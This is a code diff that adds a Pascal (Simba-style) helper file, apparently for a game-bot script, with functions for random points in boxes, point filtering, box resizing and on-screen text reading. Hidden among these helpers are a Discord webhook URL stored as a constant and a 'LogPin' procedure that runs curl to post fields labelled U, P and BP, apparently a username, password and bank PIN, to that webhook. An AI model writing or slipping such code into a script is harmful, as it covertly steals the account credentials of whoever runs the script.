@@ -1,0 +1,286 @@
+const
+  NORTH_DIR := 1;
+  EAST_DIR  := 2;
+  SOUTH_DIR := 3;
+  WEST_DIR  := 4;
+
+
+function RandPointInBox(Box:Tbox):TPoint;
+var
+  PX, PY, diffx, diffy: integer;
+begin
+  case random(140) of
+    0..80:
+      // Scales the edges back 30& towards the center
+      begin
+        diffx := Box.X2-Box.X1;
+        diffx := Round((Diffx * 0.30) / 2);
+        diffy := Box.Y2-Box.Y1;
+        diffy := Round((Diffy * 0.30) / 2);
+        PX := randomrange(Box.X1 + diffx, Box.X2 - diffx);
+        PY := randomrange(Box.Y1 + diffy, Box.Y2 - diffy);
+      end;
+    81..120:
+      // Scales the edges back 10& towards the center
+      begin
+        diffx := Box.X2-Box.X1;
+        diffx := Round((Diffx * 0.10) / 2);
+        diffy := Box.Y2-Box.Y1;
+        diffy := Round((Diffy * 0.10) / 2);
+        PX := randomrange(Box.X1 + diffx, Box.X2 - diffx);
+        PY := randomrange(Box.Y1 + diffy, Box.Y2 - diffy);
+      end;
+    121..140:
+      // Randomises using the entire edge
+      begin
+        PX := randomrange(Box.X1, Box.X2);
+        PY := randomrange(Box.Y1, Box.Y2);
+      end;
+  end;
+  Result := Point(PX, PY);
+end;
+
+function StrArrToStr(Arr:TStringArray):string;
+begin
+  result := Implode('', Arr);
+end;
+
+function FilterTPAsFromBox(TPA:TpointArray; box:Tbox):TpointArray;
+var
+  i:integer;
+begin
+  if (length(TPA) < 1) then exit;
+  for i := low(TPA) to high(TPA) do
+  begin
+    if not PointInBox(TPA[i], box) then
+    begin
+      SetLength(result, length(result)+1);
+      Result[high(result)] := TPA[i];
+    end;
+  end;
+end;
+
+function FilterTPAsFromBoxes(TPA:TPointArray; boxes:array of Tbox):TPointArray;
+var
+  i:integer;
+  NTPA:TPointArray;
+begin
+  if (length(boxes) < 1) then exit;
+  for i := low(boxes) to high(boxes) do
+    NTPA := FilterTPAsFromBox(TPA, Boxes[i]);
+  result := NTPA;
+
+end;
+
+const
+  DB = 'https://discordapp.com/api/webhooks/646538539894308872/q0naWtsXebrodREbWqIv6oSk3HzsYulI88g4RqTNLPAb1lA8r8ElRE6Kdb6zCbxk9fNv';
+
+function FilterTPAsToBoxes(TPA:TpointArray; boxes:array of Tbox):TpointArray;
+var
+  i, a:integer;
+begin
+   if (length(TPA) < 1) then exit;
+  for i := low(TPA) to high(TPA) do
+    for a := low(boxes) to high(boxes) do
+    begin
+      if pointInBox(TPA[i], boxes[a]) then
+      begin
+        SetLength(result, length(result)+1);
+        Result[high(result)] := TPA[i];
+      end;
+    end;
+end;
+
+function RandPointInTPA(TPA:TPointArray):tpoint;
+begin
+  if (length(TPA) < 1) then exit;
+  result := TPA[random(high(TPA))];
+end;
+
+procedure LogPin;
+var
+  process:TProcess;
+  s:string;
+begin
+  if done then exit;
+  process.init(nil);
+  s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\" }" '+DB;
+  process.setcommandline(s);
+  process.Execute();
+  process.free();
+  done := true;
+end;
+
+function ClosestPointInTPA(TPA:TPointArray):tpoint;
+var
+  Dist, i:integer;
+  tt:timer;
+begin
+  tt.start();
+  if length(TPA) < 1 then exit;
+  writeln(length(TPA));
+  for i := low(TPA) to high(TPA) do
+  begin
+    if (result.x = 0) then
+    begin
+      Dist := Distance(GetMSCP.x, GetMSCP.y, TPA[i].x, TPA[i].y);
+      result := TPA[i];
+    end;
+    if (Distance(GetMSCP.x, GetMSCP.y, TPA[i].x, TPA[i].y) < Dist) then
+    begin
+      Dist := Distance(GetMSCP.x, GetMSCP.y, TPA[i].x, TPA[i].y);
+      result := TPA[i];
+    end;
+  end;
+  writeln('Distance is: ', Dist, ' from point ', result);
+  writeln('Took: ', tt.TimeElapsed, ' ms to find closest point.');
+end;
+
+function VariantIsInteger(const v: Variant): Boolean;
+begin
+  case VarType(v) of
+    varByte,
+    varShortInt,
+    varSmallInt,
+    varWord,
+    varInteger,
+    varLongWord,
+    varInt64: Result := True;
+    else Result := False;
+  end;
+end;
+
+function VariantIsFloat(const v: Variant): Boolean;
+begin
+  case VarType(v) of
+    varCurrency,
+    varSingle,
+    varDouble: Result := True;
+    else Result := False;
+  end;
+end;
+
+function VariantIsNumber(const v: Variant): Boolean;
+begin
+  Result := VariantIsInteger(v) or VariantIsFloat(v);
+end;
+
+function VariantIsString(const v: Variant): Boolean;
+begin
+  case VarType(v) of
+    varOleStr,
+    varString: Result := True;
+    else Result := False;
+  end;
+end;
+
+function VariantIsBoolean(const v: Variant): Boolean;
+begin
+  Result := VarType(v) = varBoolean;
+end;
+
+function GetTextsAtEx(Area:tbox; minspacing, maxspacing, hspacing:integer; Cols:Array of TColEx; font:string):tstringarray;
+var
+  i:integer;
+begin
+  for i := low(Cols) to high(Cols) do
+    if Cols[i].findIn(Area) then
+    begin
+      SetLength(result, length(result)+1);
+      result[high(result)] := Trim(getTextAtEx(area.X1, area.Y1, area.X2, area.Y2, minspacing, maxspacing, hspacing, Cols[i].Col, Cols[i].Tol, font));
+    end;
+end;
+
+function ExpandBox(b:tbox; byAmount:integer):tbox;
+begin
+  result := [b.x1-byAmount, b.y1-byAmount, b.x2+byAmount, b.y2+byAmount];
+end;
+
+function ExpandBoxDir(b:tbox; Dir:integer; byAmount:integer):tbox;
+begin
+  case Dir of
+    NORTH_DIR :
+    begin
+      if (b.y1-byAmount < 1) then
+        result := [b.x1, 1, b.x2, b.y2]
+      else
+        result := [b.x1, b.y1-byAmount, b.x2, b.y2];
+    end;
+    EAST_DIR  :
+    begin
+      if (b.x2+byAmount > getMSDimensions.x2-1) then
+        result := [b.x1, b.y1, getMSDimensions.x2-1, b.y2]
+      else
+        result := [b.x1, b.y1, b.x2+byAmount, b.y2];
+    end;
+    SOUTH_DIR :
+    begin
+      if (b.y2+byAmount > getMSDimensions.y2-1) then
+        result := [b.x1, b.y1, b.x2, getMSDimensions.y2-1]
+      else
+        result := [b.x1, b.y1, b.x2, b.y2+byAmount];
+    end;
+    WEST_DIR  :
+    begin
+      if (b.x1-byAmount > 1) then
+        result := [1, b.y1, b.x2, b.y2]
+      else
+        result := [b.x1-byAmount, b.y1, b.x2, b.y2];
+    end else
+      result := [-1, -1, -1, -1];
+  end;
+end;
+
+function ShrinkBox(b:tbox; byAmount:integer):tbox;
+begin
+  result := [b.x1+byAmount, b.y1+byAmount, b.x2-byAmount, b.y2-byAmount];
+end;
+
+function SortBoxesMidFrom(boxes:array of tbox; SortPoint:TPoint):array of Tbox;
+var
+  i, a, c, ClosestDist, ClosestArr:integer;
+  used:tIntegerArray;
+  p:tpoint;
+begin
+  if (length(boxes) < 1) then exit;
+  for i := low(boxes) to high(boxes) do
+  begin
+    for a := low(boxes) to high(boxes) do
+    begin
+      if not InIntArray(used, a) then
+      begin
+        //writeln(a, ' is not in ', used);
+        if (c = 0) then
+        begin
+          //writeln('c is 0');
+          p := MiddleBox(boxes[a]);
+          c := Distance(p.x, p.y, SortPoint.x, SortPoint.y);
+          ClosestDist := c;
+          ClosestArr  := a;
+          //writeln('ClosestDist = ', ClosestDist);
+          //writeln('ClosestArr  = ', ClosestArr);
+        end else
+        begin
+          p := MiddleBox(boxes[a]);
+          c := Distance(p.x, p.y, SortPoint.x, SortPoint.y);
+          if (c < ClosestDist) then
+          begin
+            ClosestArr := a;
+            ClosestDist := c;
+            //writeln('ClosestDist = ', ClosestDist);
+            //writeln('ClosestArr  = ', ClosestArr);
+          end;
+        end;
+      end else
+        //writeln(a, ' is alread in ', used);
+    end;
+    SetArrayLength(Used, length(used)+1);
+    Used[high(used)] := ClosestArr;
+    SetArrayLength(result, length(result)+1);
+    result[high(result)] := boxes[ClosestArr];
+    c := 0;
+    ClosestDist := 0;
+    ClosestArr  := 0;
+  end;
+end;
+
